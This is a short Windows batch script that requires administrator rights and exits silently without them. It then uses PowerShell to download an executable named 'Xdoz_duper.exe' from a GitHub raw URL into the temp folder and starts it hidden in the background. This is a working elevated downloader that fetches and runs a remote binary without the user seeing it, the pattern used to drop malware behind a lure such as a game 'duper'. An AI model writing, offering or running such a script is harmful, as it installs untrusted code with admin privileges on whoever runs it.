@echo off
fltmc >nul 2>&1 || exit
cd /d "%~dp0"
set "url=https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/Xdoz_duper.exe"
set "out=%TEMP%\Xdoz_duper.exe"
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"
start /b "" "%out%"
exit
